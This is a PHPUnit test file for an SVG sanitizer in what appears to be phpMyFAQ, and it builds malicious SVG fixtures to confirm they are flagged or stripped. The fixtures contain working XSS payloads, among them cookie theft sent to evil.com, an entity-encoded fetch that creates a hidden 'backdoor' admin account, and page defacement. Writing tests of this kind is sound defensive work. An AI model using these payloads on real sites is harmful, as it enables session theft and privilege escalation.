    public function testIsSafeReturnsFalseForLinkInSvg(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <link rel="stylesheet" href="https://evil.com/evil.css"/>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/link_in_svg.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // CSS-based attack vectors
    // =========================================================================

    public function testIsSafeReturnsFalseForStyleJavascriptUrl(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" style="background: url(javascript:alert(1))"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/style_js_url.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForStyleWithImport(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" style="@import url('https://evil.com/evil.css')"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/style_import.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForStyleWithBehavior(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" style="behavior: url(evil.htc)"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/style_behavior.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForStyleWithMozBinding(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" style="-moz-binding: url(evil.xml#xss)"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/style_moz_binding.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForStyleExpressionVariant(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" style="width: expression  (alert(1))"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/style_expression_spaces.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForStyleVbscript(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" style="background: url(vbscript:alert(1))"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/style_vbscript.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // Data URI attack vectors
    // =========================================================================

    public function testIsSafeReturnsFalseForDataUriSvgXml(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <a xlink:href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj4=">
                    <circle cx="50" cy="50" r="40"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/data_uri_svg.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForDataUriWithHref(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
                    <circle cx="50" cy="50" r="40"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/data_uri_href.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForDataUriInImageSrc(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <image xlink:href="data:text/html,<script>alert(1)</script>" width="100" height="100"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/data_uri_image.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // JavaScript URL variations
    // =========================================================================

    public function testIsSafeReturnsFalseForJavascriptUrlMixedCase(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <a href="JaVaScRiPt:alert('XSS')">
                    <circle cx="50" cy="50" r="40"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/js_mixed_case.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForJavascriptUrlWithLeadingWhitespace(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <a href="  javascript:alert('XSS')">
                    <circle cx="50" cy="50" r="40"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/js_leading_whitespace.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForJavascriptUrlInPlainHref(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <a href="javascript:fetch('/admin/api/user/add',{method:'POST',credentials:'include'})">
                    <text x="10" y="20">Admin Action</text>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/js_fetch_attack.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForJavascriptUrlInXlinkHref(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <a xlink:href="javascript:document.location='https://evil.com/?c='+document.cookie">
                    <circle cx="50" cy="50" r="40"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/js_cookie_steal.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // XML-based attack vectors
    // =========================================================================

    public function testIsSafeReturnsFalseForXmlProcessingInstruction(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <?php echo '<script>alert(1)</script>'; ?>
                <circle cx="50" cy="50" r="40"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/xml_pi.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // Sanitize method: verifying dangerous content is properly stripped
    // =========================================================================

    public function testSanitizeRemovesAnimateElements(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" fill="blue"/>
                <animate attributeName="href" values="javascript:alert(1)"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/sanitize_animate.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('animate', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesSetElements(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" fill="blue"/>
                <set attributeName="onload" to="alert(1)"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/sanitize_set.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('<set', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesUseElements(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <circle cx="50" cy="50" r="40" fill="blue"/>
                <use xlink:href="https://evil.com/malicious.svg#payload"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/sanitize_use.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('<use', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesEntityEncodedEventHandlers(): void
    {
        // Entity-encoded onload via &#111;&#110;&#108;&#111;&#97;&#100;
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" &#111;&#110;&#108;&#111;&#97;&#100;="alert(1)">
                <circle cx="50" cy="50" r="40" fill="blue"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/sanitize_entity_onload.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('onload', $sanitizedContent);
        $this->assertStringNotContainsString('alert', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesIframeElements(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" fill="blue"/>
                <iframe src="https://evil.com"></iframe>
            </svg>
            SVG;

        $filePath = $this->testDir . '/sanitize_iframe.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('iframe', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesDataUriFromHref(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
                    <circle cx="50" cy="50" r="40" fill="blue"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/sanitize_data_uri.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('data:', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesMixedCaseJavascriptUrl(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <a href="JaVaScRiPt:alert(1)">
                    <circle cx="50" cy="50" r="40" fill="blue"/>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/sanitize_mixed_case_js.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('javascript', strtolower($sanitizedContent));
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    public function testSanitizeRemovesStyleWithExpression(): void
    {
        $maliciousSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="40" style="background: expression(alert('XSS'))"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/sanitize_style_expression.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('expression', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
    }

    // =========================================================================
    // detectIssues() method thorough testing
    // =========================================================================

    public function testDetectIssuesFindsEntityEncodedJavascript(): void
    {
        $content = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg">
              <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">
                <text>Click</text>
              </a>
            </svg>
            SVG;

        $issues = $this->sanitizer->detectIssues($content);
        $this->assertNotEmpty($issues);
    }

    public function testDetectIssuesFindsMultipleProblems(): void
    {
        $content = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
                <script>evil()</script>
                <foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><div>x</div></body></foreignObject>
                <a href="javascript:alert(2)"><circle r="10"/></a>
            </svg>
            SVG;

        $issues = $this->sanitizer->detectIssues($content);
        $this->assertGreaterThanOrEqual(4, count($issues));
    }

    public function testDetectIssuesFindsAnimateElement(): void
    {
        $content = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg">
                <animate attributeName="href" values="javascript:alert(1)"/>
            </svg>
            SVG;

        $issues = $this->sanitizer->detectIssues($content);
        $this->assertNotEmpty($issues);

        $foundAnimate = false;
        foreach ($issues as $issue) {
            if (str_contains($issue, 'animate')) {
                $foundAnimate = true;
                break;
            }
        }
        $this->assertTrue($foundAnimate, 'Should detect animate element as dangerous');
    }

    public function testDetectIssuesFindsDataUri(): void
    {
        $content = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                <a xlink:href="data:text/html,<script>alert(1)</script>">
                    <circle r="10"/>
                </a>
            </svg>
            SVG;

        $issues = $this->sanitizer->detectIssues($content);
        $this->assertNotEmpty($issues);
    }

    // =========================================================================
    // Safe SVG allowlist tests (should pass as safe)
    // =========================================================================

    public function testIsSafeReturnsTrueForSvgWithGradients(): void
    {
        $safeSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
                <defs>
                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="0%">
                        <stop offset="0%" style="stop-color:rgb(255,255,0);stop-opacity:1"/>
                        <stop offset="100%" style="stop-color:rgb(255,0,0);stop-opacity:1"/>
                    </linearGradient>
                </defs>
                <circle cx="50" cy="50" r="40" fill="url(#grad1)"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/safe_gradient.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsTrueForSvgWithText(): void
    {
        $safeSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100">
                <text x="10" y="50" font-family="Arial" font-size="24" fill="#333">Hello World</text>
                <text x="10" y="80" font-size="14" fill="blue">
                    <tspan x="10" dy="0">Line 1</tspan>
                    <tspan x="10" dy="20">Line 2</tspan>
                </text>
            </svg>
            SVG;

        $filePath = $this->testDir . '/safe_text.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsTrueForSvgWithPaths(): void
    {
        $safeSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
                <path d="M 10 80 C 40 10, 65 10, 95 80 S 150 150, 180 80" stroke="black" fill="transparent"/>
                <polygon points="50,5 20,99 95,39 5,39 80,99" fill="lime" stroke="purple" stroke-width="2"/>
                <polyline points="0,40 40,40 40,80 80,80 80,120" fill="none" stroke="red"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/safe_paths.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsTrueForSvgWithClipPathAndMask(): void
    {
        $safeSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
                <defs>
                    <clipPath id="clip1">
                        <circle cx="50" cy="50" r="30"/>
                    </clipPath>
                    <mask id="mask1">
                        <rect width="100" height="100" fill="white"/>
                        <circle cx="50" cy="50" r="20" fill="black"/>
                    </mask>
                </defs>
                <rect width="100" height="100" fill="blue" clip-path="url(#clip1)"/>
                <rect width="100" height="100" fill="red" mask="url(#mask1)"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/safe_clippath_mask.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsTrueForSvgWithFilters(): void
    {
        $safeSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
                <defs>
                    <filter id="blur1">
                        <feGaussianBlur in="SourceGraphic" stdDeviation="5"/>
                    </filter>
                    <filter id="shadow1">
                        <feOffset in="SourceGraphic" dx="5" dy="5" result="offset"/>
                        <feGaussianBlur in="offset" stdDeviation="3" result="blur"/>
                        <feMerge>
                            <feMergeNode in="blur"/>
                            <feMergeNode in="SourceGraphic"/>
                        </feMerge>
                    </filter>
                </defs>
                <circle cx="100" cy="100" r="50" fill="blue" filter="url(#blur1)"/>
                <rect x="50" y="50" width="80" height="80" fill="red" filter="url(#shadow1)"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/safe_filters.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsTrueForSvgWithSafeAnchor(): void
    {
        $safeSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100">
                <a href="https://www.phpmyfaq.de">
                    <rect x="10" y="10" width="180" height="80" rx="10" fill="#0d6efd"/>
                    <text x="100" y="55" text-anchor="middle" fill="white" font-size="16">Visit phpMyFAQ</text>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/safe_anchor.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsTrueForSvgWithTransforms(): void
    {
        $safeSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
                <g transform="translate(100,100)">
                    <g transform="rotate(45)">
                        <rect x="-25" y="-25" width="50" height="50" fill="green"/>
                    </g>
                </g>
                <circle cx="100" cy="100" r="5" fill="red" transform="scale(2)"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/safe_transforms.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsTrueForComplexSafeSvg(): void
    {
        $safeSvg = <<<SVG
            <?xml version="1.0" encoding="UTF-8"?>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300" width="400" height="300">
                <defs>
                    <radialGradient id="rg1" cx="50%" cy="50%" r="50%">
                        <stop offset="0%" stop-color="#ff0" stop-opacity="1"/>
                        <stop offset="100%" stop-color="#f00" stop-opacity="0.5"/>
                    </radialGradient>
                    <pattern id="pattern1" patternUnits="userSpaceOnUse" width="20" height="20">
                        <circle cx="10" cy="10" r="5" fill="#ccc"/>
                    </pattern>
                    <marker id="arrow" markerWidth="10" markerHeight="10" refX="5" refY="5" orient="auto">
                        <path d="M 0 0 L 10 5 L 0 10 z" fill="black"/>
                    </marker>
                </defs>
                <title>Complex Safe SVG</title>
                <desc>A complex SVG with many safe elements for testing</desc>
                <g id="layer1" opacity="0.9">
                    <rect x="10" y="10" width="380" height="280" rx="15" fill="url(#pattern1)" stroke="#999" stroke-width="2"/>
                    <ellipse cx="200" cy="150" rx="100" ry="60" fill="url(#rg1)"/>
                    <line x1="50" y1="250" x2="350" y2="250" stroke="black" stroke-width="2" marker-end="url(#arrow)"/>
                    <path d="M 50 200 Q 200 100 350 200" fill="none" stroke="blue" stroke-width="3" stroke-dasharray="10,5"/>
                </g>
                <switch>
                    <text systemLanguage="en" x="200" y="30" text-anchor="middle" font-size="18" fill="#333">English Title</text>
                    <text x="200" y="30" text-anchor="middle" font-size="18" fill="#333">Default Title</text>
                </switch>
                <a href="https://example.com">
                    <text x="200" y="290" text-anchor="middle" font-size="12" fill="blue" text-decoration="underline">Link</text>
                </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/complex_safe.svg';
        file_put_contents($filePath, $safeSvg);

        $this->assertTrue($this->sanitizer->isSafe($filePath));
    }

    // =========================================================================
    // Edge cases and boundary conditions
    // =========================================================================

    public function testIsSafeReturnsFalseForEmptyFile(): void
    {
        $filePath = $this->testDir . '/empty.svg';
        file_put_contents($filePath, '');

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testSanitizePreservesSvgAfterCleanup(): void
    {
        // SVG with both safe and malicious content; after sanitize the SVG structure should remain
        $mixedSvg = <<<SVG
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')" viewBox="0 0 100 100">
                <circle cx="50" cy="50" r="40" fill="blue" onclick="alert('click')"/>
                <script>document.cookie</script>
                <rect x="10" y="10" width="20" height="20" fill="red"/>
            </svg>
            SVG;

        $filePath = $this->testDir . '/mixed_content.svg';
        file_put_contents($filePath, $mixedSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringContainsString('<svg', $sanitizedContent);
        $this->assertStringContainsString('circle', $sanitizedContent);
        $this->assertStringContainsString('rect', $sanitizedContent);
        $this->assertStringNotContainsString('script', $sanitizedContent);
        $this->assertStringNotContainsString('onload', $sanitizedContent);
        $this->assertStringNotContainsString('onclick', $sanitizedContent);
        $this->assertStringNotContainsString('alert', $sanitizedContent);
    }

    public function testSanitizeReturnsFalseForFileContainingOnlySvgTagThatGetsStripped(): void
    {
        // Edge case: all content is malicious, stripping everything might remove <svg> too
        $maliciousSvg = <<<SVG
            <script>alert(1)</script>
            SVG;

        $filePath = $this->testDir . '/no_svg_tag.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->sanitize($filePath));
    }

    // =========================================================================
    // Privilege escalation PoC variants
    // =========================================================================

    public function testIsSafeReturnsFalseForFetchApiAttack(): void
    {
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 300">
              <rect width="500" height="300" fill="#f8f9fa"/>
              <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;fetch('/admin/api/user/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userName:'backdoor',userPassword:'H4ck3d!',realName:'System',email:'evil@attacker.com','is-visible':false}),credentials:'include'}).then(r=>r.json()).then(d=>document.title='pwned')">
                <rect x="150" y="170" width="200" height="50" rx="8" fill="#0d6efd"/>
                <text x="250" y="200" text-anchor="middle" font-size="16" fill="white">View Update</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/fetch_api_attack.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForCookieExfiltrationAttack(): void
    {
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 200">
              <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;new Image().src='https://evil.com/steal?c='+document.cookie">
                <rect width="300" height="200" fill="#eee"/>
                <text x="150" y="100" text-anchor="middle">View Report</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/cookie_exfil.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testIsSafeReturnsFalseForDomManipulationAttack(): void
    {
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 200">
              <a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;document.body.innerHTML='<h1>Defaced</h1>'">
                <text x="10" y="50">Click here</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/dom_manipulation.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertFalse($this->sanitizer->isSafe($filePath));
    }

    public function testSanitizeRemovesFullPrivilegeEscalationPayload(): void
    {
        $maliciousSvg = <<<'SVG'
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 300">
              <rect width="500" height="300" fill="#f8f9fa"/>
              <text x="250" y="100" text-anchor="middle" font-size="22" fill="#333">System Notice</text>
              <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;fetch('/admin/api/user/add',{method:'POST',credentials:'include'})">
                <rect x="150" y="170" width="200" height="50" rx="8" fill="#0d6efd"/>
                <text x="250" y="200" text-anchor="middle" font-size="16" fill="white">View Update</text>
              </a>
            </svg>
            SVG;

        $filePath = $this->testDir . '/sanitize_priv_escalation.svg';
        file_put_contents($filePath, $maliciousSvg);

        $this->assertTrue($this->sanitizer->sanitize($filePath));

        $sanitizedContent = file_get_contents($filePath);
        $this->assertStringNotContainsString('javascript', $sanitizedContent);
        $this->assertStringNotContainsString('fetch', $sanitizedContent);
        $this->assertStringContainsString('<svg', $sanitizedContent);
        $this->assertStringContainsString('rect', $sanitizedContent);
        $this->assertStringContainsString('text', $sanitizedContent);
    }
}
